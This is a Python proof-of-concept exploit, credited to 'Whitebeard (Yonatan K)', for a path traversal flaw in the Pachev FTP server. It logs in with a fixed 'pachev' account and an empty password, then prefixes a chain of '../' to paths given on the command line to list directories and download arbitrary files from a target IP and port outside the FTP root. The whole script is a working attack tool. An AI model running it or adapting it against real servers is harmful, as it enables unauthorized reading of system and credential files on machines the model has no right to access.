import os
from ftplib import FTP
import argparse



class FTPc:

    def __init__(self, connection):
        self.connection = connection

    def listdir(self, _path):
        """
        return files and directory names within a path (directory)
        """
        file_list = []
        
        try:
            self.connection.cwd(_path)
        except Exception as exp:
            print ( "(!) No Such Path : ", exp.__str__(),_path)
            return []
        else:
            self.connection.retrlines('LIST', lambda x: file_list.append(x.split()))
         
            return file_list

    def getfile(self, _path_file):
        """
        retrieve files from a target path
        """

        f_name = os.path.basename(_path_file)
        try:
            self.connection.retrbinary('RETR %s'  % _path_file , open(f_name, 'wb').write)
            print("Successfully retrieved " + rflag)
        except Exception as exp:
            print (f" (!) No Such File {_path_file}")



def main(ip,port,*args): 
    print("  (!!) Pachev FTP Path Traversal (!!) \n  ** POC by Whitebeard (Yonatan K) \n ")
    try:
        connection = FTP()
        connection.connect(str(ip),int(port))
        connection.login('pachev', '')
        ftpc = FTPc(connection)
        tra= "../../../../../../../.."
        if lflag:
            print("Listing: " + lflag)
            for i in ftpc.listdir(tra + lflag):
                print(i)
        if rflag:
            ftpc.getfile(tra + rflag)
    except Exception as exp:
        print("Couldn't connect to FTP")




def get_opts():
    """ Get CLI argument flags """
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', required=True, help= "Target FTP IP")
    parser.add_argument('-p', required=True, help="Target FTP Port")
    parser.add_argument('-r', help= "Target File Path")
    parser.add_argument('-l',  help="Target List Path")
    args = parser.parse_args()
    return args.i, args.p, args.r, args.l




if __name__ == '__main__':

    iflag, pflag, rflag, lflag  = get_opts()

    main(iflag,pflag)

    if not (rflag or lflag):
        print('No action requested, add -l or -r args')
